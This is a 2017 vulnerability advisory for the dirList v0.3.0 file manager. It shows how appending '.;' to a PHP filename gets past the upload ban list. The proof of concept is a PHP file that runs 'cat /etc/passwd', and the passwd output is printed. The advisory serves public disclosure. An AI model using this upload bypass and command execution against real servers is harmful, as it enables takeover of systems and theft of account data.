@@ -1,0 +1,165 @@
++]###################################################################################################
+[+] Credits / Discovery: John Page 	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/DIRLIST-FILE-UPLOAD-BYPASS-CMD-EXEC.txt
+[+] ISR: Apparition
+[+]##################################################################################################
+
+
+
+Vendor:
+===============
+sourceforge.net
+
+
+Product:
+===============
+dirList v0.3.0
+
+
+Download:
+===========
+sourceforge.net/projects/dir-list/
+
+
+dirLIST displays files and folders in a given HTTP/FTP directory. It has a wonderful interface with choice of Thumbnail or List
+view along with gorgeous icons for different file types. Includes a sleek gallery, web based mp3 player, file admin + more.
+
+
+
+Vulnerability Type:
+======================================
+Bypass File Upload / CMD Execution
+
+
+
+CVE Reference:
+===============
+N/A
+
+
+Security Issue:
+===============
+
+When uploading "Banned" file types dirLIST replies with a base64 encoded error message.
+
+e.g.
+dXBsb2FkX2Jhbm5lZA== 
+
+Decoded it reads, "upload_banned".
+
+
+Banned files are setup in the "config.php" file.
+
+$banned_file_types = array('.php', '.php3', '.php4', '.php5', '.htaccess', '.htpasswd', '.asp', '.aspx'); 
+
+When upload a file, the check is made for banned file types.
+
+In "process_upload.php" on Line: 47
+
+if(in_array(strtolower(strrchr($file_name, ".")), $banned_file_types))
+	{
+		header("Location: ../index.php?folder=".$_POST['folder']."&err=".base64_encode("upload_banned"));
+		exit;
+	}
+
+
+However, appending a semicolon ";" to end of our PHP file will skirt the security check allowing
+us to upload a banned PHP file type, and our PHP file will be executed by server when accessed later.
+
+Apache manual:
+“Files can have more than one extension, and the order of the extensions is normally irrelevant. For example, if the file welcome.html.fr
+maps onto content type text/html and language French then the file welcome.fr.html will map onto exactly the same information. etc..
+
+Therefore, a file named ‘file.php.1’, can be interpreted as a PHP file and be executed on server. 
+This usually works if the last extension is not specified in the list of mime-types known to the web server. 
+
+Developers are usually unaware of the "Apache" feature to process files with some odd unexpected extension like PHP.1, PHP.; and such.
+
+
+Tested on:
+
+Windows 7
+Bitnami wampstack-5.6.29-0.
+Apache/2.4.23 (Win64)
+
+Linux
+XAMPP 5.6.8-0
+Apache/2.4.12 (Unix)
+
+
+
+Exploit/POC:
+============
+
+1) Create a banned PHP file to upload named.
+
+"TEST.php.;"
+
+2) Upload to server using dirLIST. 
+
+
+3) Done!
+
+
+<?php
+echo passthru('cat /etc/passwd');
+?>
+
+Result:
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/etc/news:
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+dbus:x:81:81:System message
+bus:/:/sbin/nologin avahi:x:70:70:Avahi
+daemon:/:/sbin/nologin
+
+etc...
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Impact:
+=================
+System Takeover
+
+
+
+Severity:
+===========
+High
+
+
+Disclosure Timeline:
+=====================
+Vendor Notification: No Replies
+January 17, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c) HYP3RLINX
